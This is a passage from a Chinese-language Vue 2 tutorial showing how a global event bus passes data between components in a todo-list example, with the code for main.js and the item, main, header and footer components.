</span></span><span class="line"><span class="cl">  <span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$off</span><span class="p">([</span><span class="nx">event1</span><span class="p">,</span> <span class="nx">event2</span><span class="p">,</span> <span class="p">...])</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span>
</span></span></code></pre></div><hr>
<h1 id="自定义事件实现组件间数据通信案例" data-numberify>自定义事件实现组件间数据通信案例<a class="anchor ms-1" href="#自定义事件实现组件间数据通信案例"></a></h1>
<p>使用自定义事件实现一个<code>todo-list</code>案例，这个案例演示了如何实现组件间数据通信。</p>
<blockquote>
<p>注：全局事件总线中，每条线的<code>$bus.$on()</code>应该在早于所有的<code>$bus.emit()</code>时执行。</p>
</blockquote>
<h2 id="mainjs" data-numberify>main.js<a class="anchor ms-1" href="#mainjs"></a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">App</span> <span class="nx">from</span> <span class="s1">&#39;./App.vue&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">render</span><span class="o">:</span> <span class="nx">h</span> <span class="p">=&gt;</span> <span class="nx">h</span><span class="p">(</span><span class="nx">App</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nx">beforeCreate</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">$bus</span> <span class="o">=</span> <span class="k">this</span> <span class="c1">// 安装全局事件总线
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span>
</span></span></code></pre></div><h2 id="todo-list-itmevue" data-numberify>todo-list-itme.vue<a class="anchor ms-1" href="#todo-list-itmevue"></a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;checkbox&#34;</span> <span class="na">:checked</span><span class="o">=</span><span class="s">&#34;isCompleted&#34;</span> <span class="err">@</span><span class="na">change</span><span class="o">=</span><span class="s">&#34;handleCheck&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>{{name}}<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-danger&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;handleDelete&#34;</span><span class="p">&gt;</span>删除<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;todo-list-item&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">props</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">id</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">type</span><span class="o">:</span> <span class="nb">String</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">type</span><span class="o">:</span> <span class="nb">String</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">isCompleted</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">type</span><span class="o">:</span> <span class="nb">Boolean</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="k">default</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 勾选或取消勾选
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">handleCheck</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 通知 App.vue 将对应的 todo 对象的 isCompleted 取反
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s1">&#39;check-todo&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 删除
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">handleDelete</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">confirm</span><span class="p">(</span><span class="sb">`是否确定删除</span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb">？`</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">$bus</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s1">&#39;remove-todo&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">li</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">list-style</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">height</span><span class="p">:</span> <span class="mi">36</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">line-height</span><span class="p">:</span> <span class="mi">36</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">padding</span><span class="p">:</span> <span class="mi">0</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">border-bottom</span><span class="p">:</span> <span class="mi">1</span><span class="kt">px</span> <span class="kc">solid</span> <span class="mh">#ddd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">li</span> <span class="nt">label</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">float</span><span class="p">:</span> <span class="kc">left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">cursor</span><span class="p">:</span> <span class="kc">pointer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">li</span> <span class="nt">label</span> <span class="nt">li</span> <span class="nt">input</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">vertical-align</span><span class="p">:</span> <span class="kc">middle</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">margin-right</span><span class="p">:</span> <span class="mi">6</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">position</span><span class="p">:</span> <span class="kc">relative</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">top</span><span class="p">:</span> <span class="mi">-1</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">li</span> <span class="nt">button</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">float</span><span class="p">:</span> <span class="kc">right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">display</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">margin-top</span><span class="p">:</span> <span class="mi">3</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">li</span><span class="p">:</span><span class="nd">before</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">content</span><span class="p">:</span> <span class="kc">initial</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">li</span><span class="p">:</span><span class="nd">last-child</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">border-bottom</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">li</span><span class="p">:</span><span class="nd">hover</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">background-color</span><span class="p">:</span> <span class="mh">#ddd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">li</span><span class="p">:</span><span class="nd">hover</span> <span class="nt">button</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">display</span><span class="p">:</span> <span class="kc">block</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="todo-mainvue" data-numberify>todo-main.vue<a class="anchor ms-1" href="#todo-mainvue"></a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">ul</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;todo-main&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 将 checkTodo 传递给子组件 --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">todo-list-item</span>
</span></span><span class="line"><span class="cl">    <span class="na">v-for</span><span class="o">=</span><span class="s">&#34;todo in todos&#34;</span> 
</span></span><span class="line"><span class="cl">    <span class="na">:key</span><span class="o">=</span><span class="s">&#34;todo.id&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="na">:id</span><span class="o">=</span><span class="s">&#34;todo.id&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="na">:name</span><span class="o">=</span><span class="s">&#34;todo.name&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="na">:isCompleted</span><span class="o">=</span><span class="s">&#34;todo.isCompleted&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">TodoListItem</span> <span class="nx">from</span> <span class="s1">&#39;./todo-list-item.vue&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;todo-main&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">TodoListItem</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">props</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 从父组件获取一个 todos 列表
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">todos</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">type</span><span class="o">:</span> <span class="nb">Array</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">todo-main</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">margin-left</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">border</span><span class="p">:</span> <span class="mi">1</span><span class="kt">px</span> <span class="kc">solid</span> <span class="mh">#ddd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">border-radius</span><span class="p">:</span> <span class="mi">2</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">padding</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">todo-empty</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">height</span><span class="p">:</span> <span class="mi">40</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">line-height</span><span class="p">:</span> <span class="mi">40</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">border</span><span class="p">:</span> <span class="mi">1</span><span class="kt">px</span> <span class="kc">solid</span> <span class="mh">#ddd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">border-radius</span><span class="p">:</span> <span class="mi">2</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">padding-left</span><span class="p">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">margin-top</span><span class="p">:</span> <span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="todo-headervue" data-numberify>todo-header.vue<a class="anchor ms-1" href="#todo-headervue"></a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;todo-header&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- 输入回车键添加 Todo --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> 
</span></span><span class="line"><span class="cl">    <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> 
</span></span><span class="line"><span class="cl">    <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;请输入你的任务名称，按回车键确认&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="na">keyup</span><span class="err">.</span><span class="na">enter</span><span class="o">=</span><span class="s">&#34;add&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span><span class="nx">nanoid</span><span class="p">}</span> <span class="nx">from</span> <span class="s1">&#39;nanoid&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;todo-header&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">todoName</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">add</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">elem</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">target</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">// 校验数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">elem</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">trim</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;输入不能为空！&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">// 将用户输入包装为 todo 对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="kr">const</span> <span class="nx">todo</span> <span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">id</span><span class="o">:</span> <span class="nx">nanoid</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="nx">elem</span><span class="p">.</span><span class="nx">value</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">isCompleted</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 通知 App 组件添加一个 todo
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">this</span><span class="p">.</span><span class="nx">$emit</span><span class="p">(</span><span class="s1">&#39;add-todo&#39;</span><span class="p">,</span> <span class="nx">todo</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 清空输入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">elem</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">todo-header</span> <span class="nt">input</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">width</span><span class="p">:</span> <span class="mi">560</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">height</span><span class="p">:</span> <span class="mi">28</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">font-size</span><span class="p">:</span> <span class="mi">14</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">border</span><span class="p">:</span> <span class="mi">1</span><span class="kt">px</span> <span class="kc">solid</span> <span class="mh">#ccc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">border-radius</span><span class="p">:</span> <span class="mi">4</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">padding</span><span class="p">:</span> <span class="mi">4</span><span class="kt">px</span> <span class="mi">7</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nc">todo-header</span> <span class="nt">input</span><span class="p">:</span><span class="nd">focus</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">outline</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">border-color</span><span class="p">:</span> <span class="nb">rgba</span><span class="p">(</span><span class="mi">82</span><span class="p">,</span> <span class="mi">168</span><span class="p">,</span> <span class="mi">236</span><span class="p">,</span> <span class="mf">0.8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">box-shadow</span><span class="p">:</span> <span class="kc">inset</span> <span class="mi">0</span> <span class="mi">1</span><span class="kt">px</span> <span class="mi">1</span><span class="kt">px</span> <span class="nb">rgba</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mf">0.075</span><span class="p">),</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">8</span><span class="kt">px</span> <span class="nb">rgba</span><span class="p">(</span><span class="mi">82</span><span class="p">,</span> <span class="mi">168</span><span class="p">,</span> <span class="mi">236</span><span class="p">,</span> <span class="mf">0.6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="todo-footervue" data-numberify>todo-footer.vue<a class="anchor ms-1" href="#todo-footervue"></a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;todo-footer&#34;</span> <span class="na">v-show</span><span class="o">=</span><span class="s">&#34;total &gt; 0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;checkbox&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;isCheckedAll&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>已完成{{completedTotal}}<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span> / 全部{{total}}
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-danger&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;clearAllCompleted&#34;</span><span class="p">&gt;</span>清除已完成任务<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;todo-footer&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">props</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* todos: {
</span></span></span><span class="line"><span class="cl"><span class="cm">      type: Array,
</span></span></span><span class="line"><span class="cl"><span class="cm">      required: true,
</span></span></span><span class="line"><span class="cl"><span class="cm">    }, */</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// todo 总数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">total</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">type</span><span class="o">:</span> <span class="nb">Number</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 被选 todo 的总数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">completedTotal</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">type</span><span class="o">:</span> <span class="nb">Number</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">required</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 计算是否全选或取消全选
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">isCheckedAll</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">get</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">completedTotal</span> <span class="o">===</span> <span class="k">this</span><span class="p">.</span><span class="nx">total</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">total</span> <span class="o">&gt;</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
